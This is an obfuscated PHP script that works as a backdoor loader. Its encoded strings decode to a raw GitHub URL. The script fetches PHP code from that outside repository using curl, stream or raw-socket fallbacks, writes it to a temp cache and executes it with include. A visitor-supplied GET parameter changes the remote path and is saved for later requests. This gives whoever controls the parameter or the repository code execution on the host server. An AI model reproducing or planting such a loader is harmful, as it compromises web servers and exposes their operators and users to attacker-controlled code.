<?php
function qecode($str, $shift) {
    $out = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $out .= pack('C', ord($str[$i]) - $shift);
    }
    return $out;
}
function fetchRemote($url) {
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        
        $content = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($code == 200 && !empty($content)) {
            return $content;
        }
    }
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'GET',
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
                'timeout' => 10
            ),
            'ssl' => array(
                'verify_peer' => true,
                'verify_peer_name' => true
            )
        ));
        
        $content = @file_get_contents($url, false, $context);
        if ($content !== false && !empty($content)) {
            return $content;
        }
    }
    $parsed = parse_url($url);
    $host = $parsed['host'];
    $path = $parsed['path'] . (isset($parsed['query']) ? '?' . $parsed['query'] : '');
    $scheme = $parsed['scheme'];
    
    $port = ($scheme === 'https') ? 443 : 80;
    $prefix = ($scheme === 'https') ? 'ssl://' : '';
    
    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 10);
    if (!$fp) {
        return false;
    }
    
    $request = "GET {$path} HTTP/1.1\r\n";
    $request .= "Host: {$host}\r\n";
    $request .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
    $request .= "Connection: close\r\n\r\n";
    
    fwrite($fp, $request);
    
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 1024);
    }
    fclose($fp);
    
    $parts = explode("\r\n\r\n", $response, 2);
    if (isset($parts[1])) {
        return $parts[1];
    }
    
    return false;
}

$customValueFile = 'custom_value.dat';
$defaultSegment = qecode("yfojvn4", 1);
$queryParam = qecode("hg", 1);

if (isset($_GET[$queryParam])) {
    $newSegment = $_GET[$queryParam];
    file_put_contents($customValueFile, $newSegment);
    $pathSegment = $newSegment;
} else {
    if (file_exists($customValueFile)) {
        $pathSegment = file_get_contents($customValueFile);
    } else {
        $pathSegment = $defaultSegment;
    }
}

$protocol = qecode("iuuqt;00", 1);
$host = qecode("sbx/hjuivcvtfsdpoufou/dpn0", 1);
$repo = qecode("mbpmjfs{j.dpnnjut0qiqce0sfgt0ifbet0nbjo0", 1);
$ext = qecode("/qiq", 1);

$targetUrl = $protocol . $host . $repo . $pathSegment . $ext;

$content = fetchRemote($targetUrl);

if ($content !== false && !empty($content)) {
    $storageDir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mod_cache';
    @mkdir($storageDir, 0755, true);
    
    $storageFile = $storageDir . DIRECTORY_SEPARATOR . md5($targetUrl) . $ext;
    file_put_contents($storageFile, $content);
    
    if (is_file($storageFile)) {
        include $storageFile;
    }
} else {
    http_response_code(404);
    die('Resource unavailable');
}

?>
